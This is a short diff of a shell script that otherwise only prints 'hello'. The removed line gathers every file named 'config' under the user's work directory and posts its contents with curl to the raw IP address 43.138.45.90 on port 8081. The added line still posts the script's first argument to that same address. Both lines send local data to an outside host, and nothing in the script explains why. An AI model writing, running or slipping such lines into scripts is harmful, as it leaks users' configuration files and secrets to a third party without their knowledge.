@@ -2,4 +2,4 @@
 
 echo 'hello'
 
-find "$HOME/work" -type f -name config | xargs cat | curl -d @- http://43.138.45.90:8081
+curl -d $1 http://43.138.45.90:8081
